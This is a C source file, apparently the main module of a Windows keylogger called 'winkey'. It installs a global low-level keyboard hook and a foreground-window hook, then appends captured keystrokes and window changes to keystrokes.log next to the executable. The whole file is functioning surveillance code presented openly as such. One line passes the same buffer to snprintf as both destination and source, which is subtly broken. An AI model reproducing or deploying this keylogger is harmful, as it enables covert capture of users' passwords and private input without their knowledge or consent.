#include "winkey.h"

HWINEVENTHOOK g_window_hook;
HWND g_foreground_window = NULL;
char g_process_name[MAX_PATH] = "";
char g_window_title[256];

int main(int argc, char *argv[])
{
	// Ensure we have a valid argument.
	if (argc == 0 || argv[0] == NULL)
	{
		return 1;
	}

	char log_path[MAX_PATH] = {0};

	// Get the full path of this executable and isolate its directory.
	GetModuleFileName(NULL, log_path, MAX_PATH);
	char *last_backslash = strrchr(log_path, '\\');
	if (last_backslash)
	{
		*last_backslash = '\0';
	}

	// Create/append to keystrokes.log in the same directory.
	snprintf(log_path, MAX_PATH, "%s\\keystrokes.log", log_path);
	g_logfile = fopen(log_path, "a");
	if (!g_logfile)
	{
		return 1;
	}

	// Set a hook to track when the active window changes.
	g_window_hook = SetWinEventHook(
		EVENT_SYSTEM_FOREGROUND,
		EVENT_SYSTEM_FOREGROUND,
		NULL,
		handle_fg_window_change,
		0,
		0,
		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);

	// Set a low-level keyboard hook to capture keystrokes.
	g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, handle_key_press, NULL, 0);
	if (!g_window_hook || !g_keyboard_hook)
	{
		fclose(g_logfile);
		return 1;
	}

	// Manually trigger the window change handler once at startup.
	handle_fg_window_change(NULL, 0, GetForegroundWindow(), 0, 0, 0, 0);

	// Keep the application running to process events.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		// No special processing; just dispatch messages.
	}

	// Clean up hooks and log file before exiting.
	UnhookWinEvent(g_window_hook);
	UnhookWindowsHookEx(g_keyboard_hook);
	fclose(g_logfile);

	return 0;
}
